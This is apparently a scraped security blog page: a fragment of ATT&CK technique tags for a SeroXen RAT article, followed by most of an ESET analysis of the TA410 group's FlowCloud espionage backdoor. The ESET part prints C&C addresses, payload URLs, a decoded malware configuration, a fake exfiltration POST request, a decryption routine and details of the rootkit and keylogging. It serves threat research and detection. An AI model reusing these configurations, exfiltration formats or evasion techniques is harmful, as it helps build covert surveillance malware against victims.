Windows Command Shell TA0003: Persistence T1547: Boot or Logon Autostart Execution T1547.001 Registry Run Keys / Startup Folder TA0004: Privilege Escalation T1548:
Abuse Elevation Control Mechanism T1548.002: Bypass User Account Control TA0005: Defense Evasion T1112: Modify Registry T1553:
Subvert Trust Controls T1553.002:
Code Signing T1564:
Hide Artifacts T1564.001:
Hidden Files and Directories T1564.003: Hidden Window TA0006: Credential Access T1552: Unsecured Credentials T1552.001:
Credentials In Files T1555: Credentials from Password Stores T1555.003: Credentials from Web Browsers TA0007:
Discovery T1016:
System Network Configuration Discovery T1033: System Owner/User Discovery T1082: System Information Discovery T1614: System Location Discovery TA0008: Lateral Movement T1021:
Remote Services T1021.001:
Remote Desktop Protocol TA009: Collection T1005:
Data from Local System T1056: Input Capture T1056.001: Keylogging T1125: Video Capture TA0011: Command and Control T1090: Proxy T1095: Non-Application Layer Protocol T1105:
Ingress Tool Transfer T1571: Non-Standard Port T1573: Encrypted Channel: T1573.001: Symmetric Cryptography References: 
Seroxen webpage Seroxen features Quasar RAT NirCmd – Windows command line tool (nirsoft.net) R77-rootkit The post SeroXen RAT for sale appeared first on Cybersecurity Insiders. 
title: A lookback under the TA410 umbrella: Its cyberespionage TTPs and activity url: https://www.welivesecurity.com/2022/04/27/lookback-ta410-umbrella-cyberespionage-ttps-activity/ ESET researchers reveal a detailed profile of TA410: we believe this cyberespionage umbrella group consists of three different teams using different toolsets, including a new version of the FlowCloud espionage backdoor discovered by ESET. 
ESET researchers have documented and analyzed TA410 activity going back to 2019.
TA410 is a cyberespionage umbrella group loosely linked to APT10, known mostly for targeting US-based organizations in the utilities sector, and diplomatic organizations in the Middle East and Africa.
TA410 has been active since at least 2018 and was first publicly revealed in August 2019 by Proofpoint in its LookBack blogpost.
A year later, the then-new and very complex malware family called FlowCloud was also attributed to TA410. 
In this blogpost, we provide a detailed profile of this APT group, including its modus operandi and toolset that includes a new version of FlowCloud, discovered by ESET.
This very complex backdoor contains interesting espionage capabilities.
ESET will present its latest findings about TA410, including results from ongoing research, during Botconf 2022.
For YARA and Snort rules, consult ESET’s GitHub account. 
Key points in this blogpost: TA410 is an umbrella group comprised of three teams ESET researchers named FlowingFrog, LookingFrog and JollyFrog, each with its own toolset and targets. 
ESET telemetry shows victims all around the world, mainly in the governmental and education sectors. 
TA410 had access to the most recent known Microsoft Exchange remote code execution vulnerabilities, e.g., ProxyLogon in March 2021 and ProxyShell in August 2021. 
ESET researchers found a new version of FlowCloud, a complex and modular C++ RAT.
It has several interesting capabilities, including: Controlling connected microphones and triggering recording when sound levels above a specified threshold volume are detected. 
Monitoring clipboard events to steal clipboard content. 
Monitoring file system events to collect new and modified files. 
Controlling attached camera devices to take pictures of the compromised computer’s surroundings. 
FlowCloud deploys a rootkit to hide its activity on the compromised machine. 
The LookBack backdoor utilized by TA410 uses a custom network protocol, which can function over HTTP or raw TCP, for C&C server communications. 
TA410 is one of the users of the Royal Road malicious document builder. 
TA410 teams compromise their targets in various ways, which indicates to us that those victims are targeted specifically, with the attackers choosing which entry method has the best chance of infiltrating the target. 
The first stage of the FlowCloud version identified by ESET researchers can check whether specific security software is installed on the machine it tries to compromise, but this isn’t implemented in the loaders we analyzed.
However, we found a custom AntivirusCheck class, which can check running processes against a hardcoded list of executable filenames from known security products, including ESET products.
In case one of these products is detected, FlowCloud goes through its regular loading process and cancels the auto_start_after_install configuration value. 
Even though we believe that this version of FlowCloud is still undergoing development and testing, the cyberespionage capabilities of this version include the ability to collect mouse movements, keyboard activity, and clipboard content along with information about the current foreground window.
This information can help attackers understand stolen data by contextualizing it. 
FlowCloud can also gather information about things happening around the victim’s computer by taking pictures using connected camera peripherals and recording audio using a computer’s microphone.
This latter function is triggered by any sound over a threshold of 65 decibels, which is in the upper range of normal conversation volume. 
Attribution ESET researchers believe that TA410 is composed of three different teams, using very similar tactics, techniques, and procedures (TTPs) but different toolsets and exiting from IP addresses located in three different districts.
These teams, referred to below as FlowingFrog, LookingFrog, and JollyFrog, have overlaps in TTPs, victimology and network infrastructure. 
FlowingFrog uses Royal Road RTF documents, a first-stage implant called Tendyron, and a very complex second-stage backdoor called FlowCloud. 
LookingFrog uses a first-stage backdoor called X4, and LookBack as a second stage. 
JollyFrog uses only generic malware families such as Korplug (aka PlugX) and QuasarRAT.
Part of the activity of this team was described by Fortinet, who attributed the activity to APT10. ESET researchers, however, believe this activity is different from the operations that APT10 (aka A41APT) has conducted recently. 
FlowingFrog and JollyFrog share network infrastructure – more precisely, the domain ffca.caibi379[.]com, as mentioned by Proofpoint. 
FlowingFrog and LookingFrog ran a phishing campaign at the same time against the same targets, as also mentioned in the same Proofpoint article. 
In ESET telemetry, we do not see any other overlap between these subgroups.
We believe that these subgroups operate somewhat independently but that they may share intelligence requirements, an access team that runs their spearphishing campaigns, and also the team that deploys network infrastructure. 
Victimology Most TA410 targets are high-profile organizations in the diplomacy and education sectors, but we have also seen victims in the military sector, a manufacturing company in Japan, a mining company in India, and a charity in Israel.
According to ESET telemetry, the victims are located in Africa, Asia, the Middle East, and Europe.
Interestingly, there is no clear segmentation of the targeting (by sector or geography) among the different teams. 
An element worth mentioning is that TA410 targets foreign individuals in China.
In ESET telemetry, we have observed this as having happened at least twice: for instance, one victim is a French academic, and another is a member of a diplomatic mission of a South Asian country in China. 
Since 2018, we have seen the following targets, also depicted in Figure 1: FlowingFrog: University, foreign diplomatic mission of a South Asian country in China, mining company LookingFrog: Diplomatic missions, charity, government and industrial manufacturing JollyFrog: Education, church, military, diplomatic mission Figure 1.
Map of countries and verticals targeted by TA410 Initial compromise and typical TTPs If we exclude the different backdoors, the three teams use a similar modus operandi.
They compromise their targets either by spearphishing, according to Proofpoint, or, for LookingFrog and JollyFrog, by compromising a web-facing application such as Microsoft Exchange or SharePoint.
This could indicate that victims are targeted specifically, with the attackers choosing which entry method is the best for a given target. 
The public-facing application compromise approach is what we have seen the most.
Attackers linked to LookingFrog exploited Microsoft SharePoint servers in 2019 to gain code execution, probably by leveraging CVE-2019-0604.
They then dropped an ASPX webshell that was used to install other malicious components.
These were either dropped directly via the webshell or downloaded from a remote server using certutil.exe, a known LOLBin. 
In 2020, we saw further exploitations by JollyFrog, of Microsoft SQL servers and IIS servers running custom applications. 
In August 2021, we observed LookBack being loaded by an IIS worker process on a server belonging to an industrial manufacturing company in Japan.
This happened following the exploitation of the Exchange ProxyShell vulnerability on that server, as we describe in ESET Threat Report T3 2021. 
This shows that LookingFrog operators closely follow the discovery of RCE vulnerabilities in popular server applications and quickly make use of any available exploit in order to gain control of unpatched servers run by organizations on their target lists. 
In addition to the full-featured backdoors analyzed in the following sections, these attackers use a variety of tools such as vulnerability scanners, exploits from the Equation Group leaks, proxy/tunneling utilities (HTran, LCX, EarthWorm), and lateral movement scripts such as WMIExec. Arsenal TA410 – FlowingFrog FlowingFrog uses a first stage that ESET researchers have named the Tendyron downloader, and a complex second stage named FlowCloud, so named by the developers in its modules’ PDB paths. 
Royal Road and Tendyron downloader Royal Road is a malicious document builder used by several cyberespionage groups (see the analysis by nao_sec).
Files built with this tool are RTF documents exploiting Equation Editor N-day vulnerabilities such as CVE-2017-11882.
TA410 operators always use the Royal Road encoding bytes: A9 A4 6E FE, as seen in Figure 2. Figure 2.
Encoded Royal Road payload On October 13th 2020, we noticed that a new Royal Road RTF document, shown in Figure 3, had been uploaded to VirusTotal. 
Figure 3.
Royal Road RTF document found on VirusTotal (SHA‑1: ADD5B4FD9AEA6A38B5A8941286BC9AA4FE23BD20) 
When opened, the document triggers the injection of a custom downloader – a PE executable – into an iexplore.exe process.
The PE resources 103, 104 and 105 contain the payload URLs, XORed with 0xD3.
The following files are downloaded and written to disk: http://103.139.2[.]93:1702/tdr.dat written to %localappdata%\Tendyron\Tendyron.exe (SHA-1: 09C76522136B5E9BAB74381FEEE265F7E9B1D550) http://103.139.2[.]93:1702/okt.dat written to %localappdata%\Tendyron\OnKeyToken_KEB.dll (SHA‑1: F359D3C074135BBCA9A4C98A6B6544690EDAE93D) http://103.139.2[.]93:1702/md.dat written to %localappdata%\Tendyron\Tendyron.conf (we were not able to retrieve this file) 
Finally, this process separately downloads http://103.139.2[.]93:1702/t86.dat (resource 101), loads it into memory, and calls its startModule export.
Unfortunately, we were not able to retrieve this sample. 
Tendyron.exe is a legitimate executable, signed by online-banking security vendor Tendyron Corporation, and that is vulnerable to DLL search-order hijacking.
Persistence for the downloaded payload is established via the Tendyron value under the Run key HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run. 
When executed, Tendyron.exe loads the malicious OnKeyToken_KEB.dll.
The export OnKeyT_ContextInit contains code that decrypts hardcoded shellcode (see Figure 4) and injects it into iexplore.exe using WriteProcessMemory. 
Figure 4.
Shellcode decryption loop The next stage, injected into iexplore.exe, is a backdoor written using the Microsoft Foundation Class (MFC) framework.
It also contains RTTI symbols and thus a few C++ class names: ClientSocket Manager DllManager KernelManager These class names are the same as used in Farfli/Gh0stRAT, a backdoor that has been used for more than 10 years to conduct (mostly) cyberespionage operations.
Its source code was leaked and is now available on GitHub.
Thus, we believe that TA410 developers reused code copied from Farfli. 
The C&C server is hardcoded, in cleartext, in the sample; in this specific case, it is set to 114.118.83[.]141. 
On VirusTotal, as shown in Figure 5, we can see one more HTTP request to 103.139.2[.]93 was triggered during the execution of the RTF file.
The result of the request to http://103.139.2[.]93:1702/SL3716/S8437AEB.DAT was recorded by VirusTotal and the SHA-1 of this encrypted file is 140F81037A76B7B16A00E1D5E0E2CD9F6687F642.
This URI is typical of those used to download FlowCloud, a complex C++ implant described in the next section. 
Figure 5. URL requests seen by the VirusTotal sandbox during execution of the malicious RTF document 
The identical encrypted file was also downloaded from http://114.55.109[.]199:56022/SL3716/S8437AEB.DAT by a FlowCloud dropper version 4.1.3 (SHA‑1: 014421BDB1EA105A6DF0C27FC114819FF3637704).
A summary of the compromise chain is provided in Figure 6. Figure 6.
Compromise chain from the Royal Road document to FlowCloud FlowCloud FlowCloud is a complex implant written in C++.
It consists of three main components, deployed in a multistage process that uses various obfuscation and encryption techniques to hinder analysis.
Multiple versions of FlowCloud have been identified since 2020, most notably versions 4.1.3 and 5.0.1 described by Proofpoint.
In this section, we analyze FlowCloud versions 5.0.2 and 5.0.3.
Contrary to those previously found, the samples we obtained for version
5.0.2 contain verbose error messages and meticulous logging. 
This deployment process is very similar to the one described by Proofpoint for version 5.0.1.
The three main components are a driver with rootkit functionality, a simple persistence module, and a custom backdoor.
We describe these in detail in the upcoming sections. 
Loader (ClientLdrExe) 
The first stage is responsible mostly for creating the files and registry keys used by the other stages.
The values for these executables and configuration data can be found, encrypted, in the loader’s resource section.
Table 1 contains an overview of these resources and their use. 
Table 1.
Contents of the dropper’s resources Resource IDRoleInternal name 100FlowCloud RAT DLLfcClientDll 10132-bit rootkit driverDriver 10264-bit rootkit driverDriver 103DLL hijacking vulnerable appN/A 104Shellcode loaded by the malicious library in the DLL hijackingSETLANG_dlcore 105Shellcode that loads fcClient (unused)N/A 106Final dropper stagefcClient 10732-bit persistence modulefcClientWD_x86 10864-bit persistence modulefcClientWD_x64 109Legitimate library used for module stompingslam 110DLL used for hijackingXXXModule_dlcore0 1000Protobuf serialized FlowCloud configurationN/A 1001Dropper configurationN/A 2000Used as an alternative or extension to resource 2001N/A 2001Path to the registry key for the PrintProcessor service (used by the driver)N/A 10000Installation configurationN/A In the instances we observed, most resources are written to disk encrypted, and only decrypted in memory when needed.
In some cases, they are then re-encrypted but with a different key.
This technique makes it harder to dump the plaintext values from the process’s memory and to analyze exit dumps.
The paths and registry keys to use, and whether they should be decrypted before being written, are defined in the installation configuration.
The samples we analyzed all store their files in the %ProgramFiles%\MSBuild\Microsoft\Expression\Blend\msole\ directory; we believe that this is the default value.
FlowCloud uses filenames that are either similar to those of legitimate Windows files (e.g., rebare.dll which could be mistaken for rebar.dll) or innocuous looking (e.g., AC146142) to avoid suspicion. 
Figure 7 presents a graphical overview of the deployment process and its elements.
We explain each of the steps in further detail in the upcoming sections. 
Figure 7.
FlowCloud deployment process First, the loader decrypts and parses the embedded installation configuration, which uses the Windows INI format.
This configuration defines the malware’s install path along with the filename or registry key where each embedded resource is to be written.
The same values are hardcoded in the following stages, which leads us to think that the samples are generated using a builder.
In a sample we analyzed, this configuration is accompanied with comments explaining the values for some sections.
Figure 8 shows this installation configuration with the comments translated to English. 
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970 #Product name, these will be used in the configuration generator and applied to the front end[product]product_chs_name=Sky Arrowproduct_name=PCArrowIproduct_version=v5.0.2 [
general]created_folder=:\Program Files\MSBuild\Microsoft\Expression\Blend\msoleinstall_folder=:\Program Files\MSBuild\Microsoft\Expression\Blend\msoledata_folder=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\fcdata hide_user_activity_tab = 0 #File path, not including drive letter[file]100=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\responsor.dat103=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\setlang.exe104=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\setlangloc.dat#105=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\rebare.dat106=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\rescure.dat107=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\rescure86.dat108=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\rescure64.dat109=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\sspisrvui.dat110=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\setlangloc.dll101=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\E86F36C4102=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\AC1461421000=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\E19D9D4B #0x0001 Release without decryption#0x0002 Decryption release[file_out_type]100=0x0001103=0x0002104=0x0002#105=0x0002106=0x0002107=0x0002108=0x0002109=0x0002110=0x0002101=0x0001102=0x00011000=0x0001 ##Registry path: separated by'|', respectively representing HKEY_LOCAL_MACHINE, path name, value name[key]##100=0x80000002|SYSTEM\Setup\PrintResponsor|1#101=0x80000002|SYSTEM\Setup\PrintResponsor|2#102=0x80000002|SYSTEM\Setup\PrintResponsor|3#1000=0x80000002|SYSTEM\Setup\PrintResponsor|4##2000=0x80000002|SYSTEM\Setup\AllowStart\ceipCommon|1##2001=0x80000002|SYSTEM\Setup\AllowStart\ceipCommon|22001=0x80000002|SYSTEM\Setup\AllowStart\ceipCommon|1 ##0x0001 Release without decryption##0x0002 Decryption release[key_out_type]##100=0x0001#101=0x0001#102=0x0001#1000=0x0001#2000=0x00022001=0x0002 #Service Information: hhw.exe needs to be dynamically generated[service_attribute]is_hhw=0service_name=PrintResponsorservice_path=%ProgramFiles%\MSBuild\Microsoft\Expression\Blend\msole\setlang.exeservice_parm= Figure 8.
Installation configuration with explanatory comments.
Note that some fields are commented out. 
The configuration can also contain a section defining specific security software to check for, but this isn’t implemented in the loaders we analyzed.
However, there is a custom AntivirusCheck class, which can check running processes against a hardcoded list of XOR-encrypted executable filenames from known security products: 360 Total Security, Avast, Avira, AVG, Bitdefender, ESET, Jiangmin Technology Antivirus, Kingsoft, McAfee, Micropoint, Norton, Rising Antivirus, and Trend Micro.
This class is only used if the loader is set to directly start the fcClient module via the auto_start_after_install configuration key. 
Depending on the configuration keys used, the loader can either load the fcClientDll RAT module directly, thus bypassing most of the complex deployment process, or it can create a service or scheduled task.
In the former case, the task or service attains persistence by being set to start automatically on boot.
In the samples we observed, the task or service was configured to execute the next step of the installation process by running a legitimate application vulnerable to DLL search-order hijacking.
The application and the accompanying relevant and malicious DLL were both embedded in the loader’s resources. 
DLL side-loading (XXXModule_dlcore0) 
In the samples we analyzed, the vulnerable application was either setlang.exe from Microsoft Office 2003 with a malicious setlangloc.dll or vpreview.exe from Visio Preview 2007 with a malicious vviewres.dll.
Strings contained in the malicious DLL also point to emedres.dll from Emurasoft’s EmEditor as a possible third target for DLL side-loading.
This is a real possibility as such vulnerabilities were present in older versions of EmEditor, but we did not see any samples using it. 
In all observed samples, the malicious library is the same and serves to load and execute shellcode from a file that is stored under the same name as the DLL, but with a .dat extension.
We analyze this shellcode in the next section, but first, we want to look at the notable anti-analysis techniques used in this library. 
Despite its relatively simple goals, the library’s code makes heavy use of anti-debugging tricks and control flow obfuscation to hinder analysis.
In the function that loads the next file, the useful code is repeatedly interspersed with the same sequence of opcodes to obfuscate the program’s flow.
As shown in Figure 9, this short snippet is packed full of anti-analysis tricks, but ultimately amounts to an unconditional 16-byte jump.
This is enough to foil many automatic analyses, including decompilers. 
Figure 9.
Annotated disassembly of the control flow obfuscation snippet The above snippet is bookended by calls to two anti-debugging functions, as can be seen in Figure 10.
The function, which we named crash_if_debugger in the previous screenshot, calls IsDebuggerPresent and checks some commonly hooked library functions for a breakpoint as their first instruction.
If those checks detect a debugger, the function returns a value that will cause the program to jump to an invalid address and crash.
The second one raises an exception via the INT 0x2D instruction and exits if it was handled by a debugger. Figure 10.
Decompiler view showing the obvious pattern of anti-debugging checks.
Note that we had to remove the aforementioned obfuscation for the decompiler to produce any output. 
fcClient (rescure.dat) 
When it is first executed, this module sets up persistence and installs the backdoor, rootkit, and persistence modules.
It then sets specific registry keys and files as guardrails to skip the setup on subsequent runs. 
First, persistence is established by using the ITaskService COM interface to create the \Microsoft\Windows\CertificateServicesClient\NetTask scheduled task.
If a task with the same name already exists, it is deleted before the new one is created.
This task will run the DLL hijacking target as SYSTEM at each boot. 
Afterwards, the rootkit module is decrypted and written to the %System%\drivers folder as hidmouse.sys.
A hidmouse service is then created to run that module and is immediately started.
The file is then deleted from the disk and replaced by a copy of the legitimate hidusb.sys driver from the same folder.
Thus, anyone looking at the file on disk rather than the one mapped into memory would see a legitimate, benign file. 
On Windows 10 machines, the system time is briefly changed to make it look like the service was created in January 2013.
Both this and the use of the legitimate driver directory help the rootkit blend in with other drivers. 
The following files are copied to the %System% directory: 
The backdoor: rescure.dat A decoy DLL: sspisrvui.dat as sspisrvui.dll (timestomped to July 2013) 
The encrypted shellcode: rebare.dat The rebare.dat shellcode is very similar to that used in the self-decrypting DLL, but it loads fcClient directly. 
FlowCloud then starts a suspended process to perform injection on it.
This process is created via CreateProcessAsUserW using a token retrieved from the explorer.exe or winlogon.exe process in the current session. 
The injected code loads the same backdoor (rescure.dat) into the process’s memory and calls its startModule export to finish the installation.
Meanwhile, the injection process is terminated. 
At this point, installation of the backdoor is complete.
All that is left is to execute the backdoor.
To achieve this, the new process loads the decoy DLL and manually replaces its content in memory with the fcClientDll module (a process known as module stomping or DLL hollowing), before calling its main function. 
fcClientDll (responsor.dat) 
This complex module is the main component of the backdoor.
It provides a wide range of capabilities from full file system access to control of camera peripherals and everything in between.
Although we did not observe any plug-ins, the backdoor contains code that hints that they can be used to further extend functionality. 
Before diving deeper into the functionalities, we want to highlight some notable characteristics: Configuration information and data for communications with the C&C server are Protobuf-serialized, compressed, and encrypted. 
File exfiltration is done through encrypted, Protobuf-serialized structures and is disguised as HTTP by prepending the data with a hardcoded, fake POST request.
The Content-Length header is the only variable element, as it is set to the actual size of the data sent.
This hardcoded request can be seen in Figure 11. 
Multiple functionalities are implemented through the use of COM objects and interfaces. 
POST /messagebroker/amf HTTP/1.1Host: s.peheavens.comConnection: keep-aliveContent-Length: <content_length>Origin: http://s.peheavens.comX-Requested-With: ShockwaveFlash/20.0.0.306User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36Content-Type: application/x-amfAccept: */*Referer: http://s.peheavens.com/html/portlet/ext/draco/resources/draco_manager.swf/[[DYNAMIC]]/1Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: COOKIE_SUPPORT=true; JSESSIONID=5C7E7A60D01D2891F40648DAB6CB3DF4.jvm1; COMPANY_ID=10301; ID=666e7375545678695645673d; PASSWORD=7a4b48574d746470447a303d; LOGIN=6863303130; SCREEN_NAME=4a2b455377766b657451493d; GUEST_LANGUAGE_ID=en-US Figure 11.
Hardcoded, fake HTTP POST request used for FlowCloud C&C communication This component uses an encrypted, Protobuf-serialized configuration that it tries to read from a file on disk or a registry key.
The configurations we observed were composed of three sections: 
server_config: This section contains information about the C&C servers and identification information about the victim and backdoor. 
policys [sic]: This section defines the behavior of the backdoor’s components and is described in detail in the following paragraphs. 
install_config: As the name indicates, this section defines the installation parameters. 
An example of such a server_config is shown in Figure 12.
This configuration corresponds to resource 1000 in the initial loader.
It defines the address and port for both the exfiltration server (file_server) and the C&C server (exchange_server), along with the encryption key to use for communication with each.
A fallback server can also be defined for each of these.
The file_key field defines the encryption key to use when storing files that are to be exfiltrated.
The other entries are used to identify the backdoor and the victimized host: 
product_name: A name for the backdoor in use.
PCArrowI seems to correspond to FlowCloud. 
product_version: The backdoor’s version. 
id_prefix: This value is prefixed to the generated ID.
Presumably, used to group victims or campaigns. 
id:
This value uniquely identifies the victim.
Initially, it is empty; the value is generated on the first execution using the following format: <prefix>_<current timestamp>_<machine hostname> 12345678910111213141516171819202122 server_config { product_name: “PCArrowI" product_version: "v5.0.2" id: "1202_[REDACTED]" root: "" file_server: "47.111.22[.]65" file_server_port: "80" file_server_bak: "" file_server_bak_port: "" exchange_server: "47.111.22[.]65" exchange_server_port: "81" exchange_server_bak: "" exchange_server_bak_port: "" file_server_key: "E\367\016\031<…>" xchg_server_key: "8\335\325$<…>" file_key: "U\267\323\353\<…>" 
is_audio_only: false id_prefix: "1202"} Figure 12.
server_config section of a decoded FlowCloud configuration FlowCloud’s capabilities are spread out over a series of singleton classes, each of which implements a cohesive set of functionalities related to a specific type of data or action.
These roughly follow an internal naming convention where classes with names ending with manager_handler perform actions in response to C&C commands, while those whose names end with manager automatically perform actions based on timers or event listeners. 
Each manager stores collected data in its own SQLite database, while data that is collected on demand is returned directly to the C&C server.
Data is encrypted with the aforementioned file_key before being inserted into the database.
The location of the SQLite databases is defined by the data_folder install configuration key, with the default value being %ProgramFiles%\MSBuild\Microsoft\Expression\Blend\msole\fcdata. 
The classes are orchestrated by an instance of fc_kernel_manager.
This object is responsible for initializing other components and handling C&C connections.
It can also update the local configuration when the corresponding command is received. 
As shown in Figure 13, parameters and frequency of automated actions can be specified and finely tuned through configuration policies.
Data exfiltration is likewise automated: policies can contain a cache_size or cache_count parameter, which determines how much data can be collected locally by the corresponding class before it is staged for exfiltration. 
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657 policys { keyboard_policy { state: true cycle_time: 60 limit_size: 100 cache_size: 10 } screen_policy { state: true cycle_time: 30 cache_count: 200 bit_depth: 4 } audio_policy { state: false cache_size: 100 decibel_limit: 65 continue_seconds: 15 } smfile_search_policy { guid: "XXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX" state: false research: true inc_all_removable: true inc_all_fixed: true limit_size: 1 recent_days: 30 filter: "*.doc" filter: "*.docx" filter: "*.xls" filter: "*.xlsx" filter: "*.ppt" filter: "*.pptx" filter: "*.bmp" filter: "*.jpg" filter: "*.png" filter: "*.gif" cache_size: 1024 b_exclude_system_files: true b_exclude_system_folders: true } installedapp_policy { state: false } clipboard_policy { state: false ignore_repeat: true cycle_time: 300 limit_size: 100 single_limit_size: 10 cache_size: 50 } user_activity_policy { process_activity_state: false browser_activity_state: false } } Figure 13.
The policys [sic] section of a decoded FlowCloud config As we have previously mentioned, this implant uses a lot of classes.
Rather than documenting each of them individually, we will present an overview of the available functionality by grouping them into three categories: those that interact with the file system, functionalities that collect information about programs and processes, and those that gather real-time information about user activity. 
File system FlowCloud provides interaction with the file system in a variety of ways, most of which can store file metadata and content in their SQLite database. 
One of these is a component that walks through all mapped file systems and collects files that are not excluded by filters in the smfile_search_policy.
It also creates an invisible window that listens for file creation, modification, or renaming events.
The corresponding files are collected unless they are excluded by that policy. 
Another component collects information about mapped volumes, including mount point, name, drive type, and disk usage data.
This same class collects file and directory metadata. 
As a complement to these automated measures, the backdoor implements functions that provide full access and control over the content of mounted drives.
This includes bidirectional file transfers between the C&C and the compromised machine. Programs and processes FlowCloud is able to automatically obtain a list of installed software through the use of the undocumented IShellAppManager COM interface.
This functionality can also be invoked via a C&C command.
Figure 14 shows, after the extraneous code has been removed, how that interface is used. 
Figure 14.
Simplified code showing how the IShellAppManager COM interface is used to list installed applications Other commands can be used to retrieve a detailed list of available services and currently running processes. 
Another interesting feature is the near real-time monitoring of process activity.
To achieve this, FlowCloud runs WMI queries every second to get all process creation and termination events.
The obtained information is correlated with data from the Win32_Process table for a more detailed view. 
User activity FlowCloud is able collect a miscellany of data that we have decided to group under the “User activity” umbrella. 
It has the ability to monitor the clipboard for changes and save any data it contains.
As seen in Figure 15, it achieves this by creating an invisible window with a custom class and registering two clipboard formats.
This window uses AddClipboardFormatListener (on Windows Vista or more recent) or SetClipboardViewer (on Windows XP and prior) to listen for clipboard content changes. Figure 15.
Set up monitoring of the clipboard Collected clipboard content is stored along with information about the current foreground window.
This information can help attackers understand the data by contextualizing it. 
FlowCloud can periodically take screenshots and store them with information about the foreground process and time since the last user input.
To limit the disk space used, images where fewer than 5% of the pixels differ from the most recently stored capture aren’t saved.
This feature can also be invoked on demand by the server. 
Another of the backdoor’s components records mouse and keyboard activity to a database.
It does not collect these directly, but instead acts in tandem with the keylogger component of the driver (described in the next section) by reading data from the \\.\pipe\namedpipe_keymousespy_english named pipe. 
Interestingly, FlowCloud can also gather information about things happening around the victim’s computer.
The first way it does so is through a C&C command that takes a picture using connected camera peripherals.
This feature is implemented using the CCameraDS class from OpenCV. 
The second way it can collect information about the computer’s surroundings is by recording audio.
Much like a voice assistant, FlowCloud can use a computer’s microphone to listen to its surroundings, but instead of recording being triggered by a command word, it seems to be triggered by any sound over a threshold defined by the decibel_limit field of the audio_policy.
The default value is 65 decibels, which is in the upper range of normal conversation volume (commonly defined to be anywhere between 50 and 70 dB by various sources). 
Self-decrypting DLL (setlangloc.dat) 
The loaded shellcode is a self-decrypting DLL.
It first decrypts the embedded DLL using a byte-oriented XOR-and-ADD scheme (shown in Figure 16).
The shellcode we analyzed used the key 0x7B. Once it has decrypted the embedded DLL, the shellcode manually performs the functions of LoadLibrary and calls the loaded module’s startModule export. 
for (int i=0; i < ciphertext_length; i++) plaintext[i] = ((encrypted[i] ^ key)
+ key) & 0xFF Figure 16.
Pseudocode for the DLL decryption routine This newly loaded module uses the same anti-debugging and anti-analysis techniques as the hijacking DLL described above.
On top of those, it also uses a few tricks of its own: Covers its tracks by overwriting the code previously modified by the malicious library with a useless call to lstrlenW. Base64-encoded strings are used for function imports (via GetProcAddress) and only decoded as needed. 
Exits if the process’s executable is not the expected DLL hijacking target (e.g., setlang.exe). 
The module creates a new process using the same executable and performs process injection on it, redirecting the existing thread to the written code region.
This code inside the new process launches a thread that decrypts and loads the fcClient module before calling its startModule export.
That function will perform the final stages of the installation and load the DLL containing the backdoor functionality. 
Driver (hidmouse.sys) FlowCloud’s driver serves a dual purpose: it acts as both a keylogger and a rootkit.
It accomplishes this mainly by hijacking native drivers’ handler functions for specific I/O control codes and replacing them with its own: Read (IRP_MJ_READ) for the keyboard driver (kbdclass or KeyboardClass0) Read (IRP_MJ_READ) for the mouse driver (mouclass or PointerClass0) 
Device control (IRP_MJ_DEVICE_CONTROL) for the network driver (tcpip or nsiproxy) 
The driver also provides kernel-level functionalities to be used by the RAT.
They can be invoked via IO control codes or by writing to specific registry keys. 
This module is signed with a certificate with the thumbprint 02ED6A578C575C8D9C72398E790354B095BB07BC.
Issued to Hangzhou Leishite Laser Technology Co. in 2012 by Wosign and revoked in 2014, it seems most likely this certificate was stolen. 
Keylogging In its IRP_MJ_READ handlers for keyboard and mouse events, the driver simply records IO events to lookaside lists before passing them to the legitimate handler.
This ensures that the driver doesn’t interfere in a way that could be noticeable by the user.
These events are then parsed to the format used by the backdoor’s keymouse_manager and written to the named pipe \\.\pipe\namedpipe_keymousespy_english. 
Rootkit After hijacking the aforementioned drivers, the rootkit erases the DLL names associated with them from internal structures used to display device drivers. 
The rootkit can prevent processes from being shown by utilities that list running processes, such as Task Manager.
As shown in Figure 17, it achieves this by removing their entries from the ActiveProcessLinks list of the undocumented KPROCESS kernel structure.
Since this structure is not part of the public API and can change between releases, the rootkit contains code to match the operating system’s build number to the correct offsets in this structure.
That code covers all versions from Windows XP to Windows 10 20H1.
This functionality can be invoked on any process via the IOCTL_HIDE_PROCESS_BY_PROCESSID (0x222028) control code.
It is also used, on driver startup, to hide the process with the PID contained in the registry key HKLM\HARDWARE\{76BA14B7-AF0C-4dc9-9E9D-2A6970F231D9}.
This process is further camouflaged by changing its associated executable filename to one of svchost.exe or dllhost.exe in the same kernel structure. 
Figure 17.
Function used to prevent a process from being displayed in lists of running processes Through its hijacking of the network driver, the rootkit can also hide a single process’s network traffic from local utilities.
The process whose traffic is to be hidden is set through the IOCTL_SET_TRAFFICHIDE_PROCESSID (0x222048) control code. 
Some of the rootkit’s functions are used by the fcClientDll module to hide the process in which it is running. 
Control codes to manipulate a process name in various internal structures are also exposed by the driver. 
Persistence module (fcClientWD) 
This module is relatively simple compared to other components.
The previously mentioned NetTask already accomplishes persistence in most cases, by executing on system startup.
This module complements that mechanism by ensuring persistence in a very specific edge case where execution of the malware might be interrupted: the user logs out on a system with hibernation and Fastboot enabled.
On systems where either of those is disabled, this module does nothing. 
FlowCloud v4.1.3 This older version of FlowCloud has already been described in a Proofpoint blogpost and presents similarities to the newer version described in the preceding subsections, so we will only highlight notable differences and new information revealed by our analysis. 
This version runs multiple anti-analysis and anti-detection checks before executing its payload, and terminates if any of those tests detect that the process is being analyzed.
It checks running processes for executables of several known cybersecurity vendors.
